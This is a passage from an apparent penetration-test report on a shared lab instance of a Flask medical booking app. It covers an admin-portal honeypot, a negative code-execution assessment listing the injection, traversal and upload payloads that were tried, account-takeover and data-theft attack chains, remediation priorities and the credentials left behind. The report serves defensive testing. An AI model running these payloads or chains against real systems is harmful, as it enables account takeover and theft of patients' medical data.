Pop flashes when rendering them (Flask's `get_flashed_messages` with `with_categories` already does this — the templates are not calling it), cap the list, and stop writing error text into the cookie at all.

---

## 14. Informational findings

**13. `robots.txt` decoy disclosure.** The file lists 100 randomly-suffixed bait paths (`/admin_private_95466`, `/api_dump_13280`, `/auth_restrict_1851`, …) plus one real path. Exactly one of the 100 resolves:

```
LIVE 200 /admin_portal_temp_secure_9203
```

The other 99 return 404. This is a deliberate decoy list, and the one real entry is an invitation. Nothing else is hidden behind it.

**14. No security headers.** The only header on responses is `server: cloudflare`. No `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Referrer-Policy` or `Permissions-Policy`. Standing weakness rather than a finding on its own; the missing CSP is what allowed Finding 10 to work.

**15. GET-based logout.** `GET /logout` terminates the session, so any page that can embed an image tag can log a user out. Trivial on its own. The more serious problem is Finding 8, that the session survives anyway.

**16. Verbose, persistent error messages.** Failures are written into the session cookie and rendered on every subsequent page until the browser is closed. Administrative errors distinguish account existence (Finding 7). No stack traces or paths are exposed — the application never leaks internals.

---

## 15. The admin portal — verdict

`/admin_portal_temp_secure_9203` is the only live path from the decoy list. It presents a standalone login form posting to itself with `email` and `password`.

What I tried, and what happened:

| Test | Result |
|---|---|
| SQL injection in email and password | No — clean handling, no error change |
| Empty / omitted password | Rejected |
| JSON and array request bodies | Rejected |
| Header spoofing (`X-Forwarded-For`, `X-Real-IP`, `X-Original-URL`, `X-Rewrite-URL`, `X-Admin`, `X-User-Role`) | No effect |
| Reusing a patient session cookie | No effect — separate auth |
| Mass assignment (`role=admin`, `is_admin=1`) | No effect |
| Guest sub-routes (`/dashboard`, `/users`, `/settings`, `/logs`, `/api`, `/console`, `/export`, `/backup`, `/panel`) | All 404 |
| Alternate paths (`/admin`, `/administrator`, `/manage`, `/system`, `/wp-admin`) | All 404 |
| Password reset of `admin@nilecare.com` via Finding 1 | Reset succeeds, but the portal still rejects the new password |
| Dictionary attack, 4,053 attempts | No hit, no lockout |

The reset result is the important one. I derived the admin's patient-account reset token, reset that account, and confirmed the reset worked — yet the portal login rejected the same credential with "Valid admin email verified, but the password provided is incorrect!" The admin portal validates against a credential store that the patient database does not reach.

Conclusion: it is a genuine login gate, correctly isolated from the patient account system, with no injection, no bypass and nothing behind it that I could reach. It functions as a honeypot — the bait path in `robots.txt` leads here, and the only thing an attacker gets for their trouble is an account-enumeration oracle (Finding 7). I recommend leaving the design alone and fixing the enumeration message.

---

## 16. RCE assessment — negative

I looked for code execution across every reachable surface and found none.

| Vector | Test | Result |
|---|---|---|
| Jinja2 SSTI | `{{7*7}}`, `{{7*'7'}}`, `{{config}}`, `${7*7}`, `<%= 7*7 %>` in report title, body, lab and profile name | Rendered literally, no evaluation |
| Pickle / unsafe deserialisation | Malformed and crafted tokens | `{"error":"Invalid token format"}` — strict `json.loads` |
| SQL injection | `report_id: "../../../etc/passwd"`, `"4146 OR 1=1"`, `user_id: null`, extra `role:admin` | Blocked or ignored |
| Command injection | `1;sleep 3`, `1|sleep 3`, `$(sleep 8)` in name, `date` and `discount_code` | No execution, no timing delta |
| File upload to executable path | `.py`, `.phtml`, `.html`, `.svg`, `x.php.gif`, `file.php.jpg` | `Invalid image format. Allowed formats: png, jpg, jpeg, gif.` |
| Magic-byte spoofing | PNG header on a script | `Security Error: Invalid file magic bytes signature header!` |
| Path traversal in filename | `../../../templates/evil.html`, `../trav1.png` | Basename stripped; written to `/static/uploads/attachments/` |
| Uploaded file executed | `GET /static/uploads/attachments/foo.html.png` | `200 image/png` — served as static content, not executed |
| Directory listing | `/static/uploads/attachments/` | Not enabled |
| Flask debug console | `/console` | 404, debug mode off |
| Source disclosure | `/static/../app.py`, `/.git/HEAD`, `/.env`, `/app.py`, `/requirements.txt`, `/config.py`, `/backup.zip`, `/.DS_Store` | All 404 |
| Secret key brute force | 38 candidate `SECRET_KEY` values | No forged cookie accepted |

No RCE. The application is a business-logic and authorisation lab, not a code-execution target.

---

## 17. Attack chains

**Chain A — unauthenticated takeover of any known account (Critical).**
Know an email → derive `md5(email)` → `POST /reset-password` → log in → read medical records, change email, lock the owner out. Two requests. No victim interaction. Demonstrated end to end.

**Chain B — authenticated cross-patient medical data theft (High).**
Register → read your own report to learn the token format → rewrite `user_id` → read anyone's report → harvest name, email and phone from the response → feed those addresses into Chain A → take over the accounts you just found. The two findings compound: the IDOR supplies the email addresses that the reset flaw converts into account takeovers.

**Chain C — financial manipulation (High).**
Set `discount_pct=100` to book every lab test for free, and overdraw the points wallet with concurrent transfers. Both are pure client-side trust.

**Chain D — session theft to permanent takeover (Medium).**
Steal a cookie by any means → change the password and email via `/profile` → the victim cannot recover, and logging out does not help because the session is never invalidated.

---

## 18. Remediation priority

1. **Replace the reset token.** CSPRNG, stored hashed, single-use, 15-minute expiry, bound to the user. Stop echoing it in the response. This closes Findings 1 and 2 and is a small, self-contained change.
2. **Authorise the reports API from the session.** Ignore `user_id` in the token, compare the report's owner to `session["user_id"]`, and sign the token if it must stay. Closes Finding 3.
3. **Move pricing server-side.** Never accept `discount_pct` or any amount from the client. Closes Finding 4.
4. **Make transfers atomic.** Conditional `UPDATE` with a balance guard, inside a transaction. Closes Finding 5.
5. **Require re-authentication on `/profile`** and add the CSRF token already used elsewhere in the app. Closes Finding 6.
6. **Uniform admin error message, rate limit, lockout.** Closes Finding 7.
7. **Server-side sessions with real invalidation.** Closes Finding 8, and makes Findings 6 and 9 much less dangerous.
8. **Cookie flags, CSP, HSTS.** Defence in depth.

---

## 19. Cleanup and residual state

The instance is shared with other testers, and I changed state while testing. What I touched:

| Item | State left behind |
|---|---|
| `mm@mm` (user 1205) | Password changed to `NoCurrentPass!1`; display name `XSS PoC`; balance **-800 pts** from the race test |
| `owned@attacker.local` (user 1294) | Password changed to `PwnedByToken!1` via Finding 1 |
| `admin@nilecare.com` (patient record) | Password reset to `Tok3nDerived!2026` during the admin-portal test |
| `massassign1793227816@test.local` (user 1321) | Registered during mass-assignment testing |
| Reports | Several test reports created with XSS and SSTI payloads in title, lab and body |
| Lab bookings | Abdominal Ultrasound booked at 0 EGP; CBC at 350 EGP |
| Uploads | `foo.png`, `trav1.png`, `foo.html.png` in `/static/uploads/attachments/` |

Uploaded payload files are inert — the server rejects anything that is not a real image and serves the rest as static content with the correct `image/*` type. Nothing I left behind executes.

Credentials for the accounts above should be treated as compromised and rotated, or the accounts deleted, before this instance is used for anything.

---

## 20. What I did not find

For the avoidance of doubt, because absence of a finding is also a result:

- **No RCE**, on any surface, by any technique (§16).
- **No SQL injection**, including in the report token, the admin login and every parameter on the booking and profile forms.
- **No SSTI**, even though the stack is Flask/Jinja2 and the payloads reach the templates.
- **No SSRF** — the application makes no outbound requests from user input.
- **No CORS misconfiguration** — `Origin: https://evil.example` with credentials produced no `Access-Control-*` headers on any endpoint.
- **No HTTP method tampering** — `PUT`, `PATCH`, `DELETE` and `TRACE` return 405 on every route; `OPTIONS` is handled by Flask's default.
- **No mass assignment** — `role`, `is_admin`, `user_id`, `balance` and `points` are ignored on registration.
- **No Host header poisoning** — reset links are relative, so `Host` and `X-Forwarded-Host` injection does not reach them.
- **No parameter pollution** — duplicate parameters resolve to the first value, consistently.
- **No admin panel bypass** (§15).
- **No sensitive file disclosure** — `.git`, `.env`, source files, backups and directory listings are all absent.

---
